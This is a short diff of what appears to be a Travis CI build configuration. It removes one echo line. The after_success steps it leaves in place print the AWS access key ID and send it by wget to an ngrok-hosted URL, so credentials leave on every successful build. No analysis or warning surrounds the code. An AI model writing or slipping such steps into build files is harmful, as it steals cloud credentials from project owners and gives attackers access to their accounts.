@@ -14,7 +14,6 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AAAA
   - echo $AWS_ACCESS_KEY_ID
   - wget http://15352579362d.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - docker --version
